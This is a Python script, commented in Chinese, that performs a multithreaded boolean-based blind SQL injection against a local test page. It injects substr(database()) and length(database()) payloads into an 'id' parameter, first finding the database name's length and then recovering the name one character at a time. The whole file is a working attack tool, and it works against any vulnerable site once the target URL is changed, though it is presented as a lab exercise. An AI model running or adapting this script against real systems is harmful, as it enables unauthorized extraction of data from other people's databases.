"""
多线程布尔盲注爆破数据库名示例
适用环境：本地 SQL-Injection.php 测试页面
判断依据：页面返回内容包含 "User:" 表示条件为真
"""

import string
import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 5
THREADS = 10                     # 并发线程数
MAX_LENGTH = 20                   # 数据库名最大长度

# 字符集：数字、大小写字母、下划线
CHARSET = string.digits + string.ascii_letters + '_'

def make_request(payload):
    """发送请求，返回响应文本或None"""
    try:
        params = {'id': payload}
        resp = requests.get(TARGET_URL, params=params, timeout=TIMEOUT)
        return resp.text
    except requests.RequestException:
        return None

def is_true(html):
    """判断页面是否为真（存在 User: 表示有数据返回）"""
    return html is not None and "User:" in html

def test_char(pos, ch):
    """测试第 pos 位是否为字符 ch（用于多线程）"""
    payload = f"1' and substr(database(),{pos},1)='{ch}' -- -"
    html = make_request(payload)
    if is_true(html):
        return ch
    return None

def get_database_length():
    """爆破数据库长度（单线程）"""
    print("[*] 正在爆破数据库长度...")
    for length in range(1, MAX_LENGTH + 1):
        payload = f"1' and length(database())={length} -- -"
        html = make_request(payload)
        if is_true(html):
            print(f"[+] 数据库长度: {length}")
            return length
    print("[-] 未找到数据库长度")
    sys.exit(1)

def get_database_name_multithread(length):
    """多线程爆破数据库名"""
    print("[*] 正在多线程爆破数据库名...")
    db_name = ""
    for pos in range(1, length + 1):
        found = False
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            future_to_char = {executor.submit(test_char, pos, ch): ch for ch in CHARSET}
            for future in as_completed(future_to_char):
                result = future.result()
                if result:
                    db_name += result
                    print(f"[+] 第 {pos} 位: {result}")
                    found = True
                    # 取消其他未完成的任务（可选）
                    for f in future_to_char:
                        f.cancel()
                    break
        if not found:
            print(f"[-] 第 {pos} 位未匹配到字符，置为 '?'")
            db_name += '?'
    return db_name

def main():
    print("=" * 50)
    print("多线程布尔盲注 - 数据库名爆破")
    print("=" * 50)
    length = get_database_length()
    name = get_database_name_multithread(length)
    print("\n" + "=" * 50)
    print(f"[最终结果] 数据库名: {name}")
    print("=" * 50)

if __name__ == "__main__":
    main()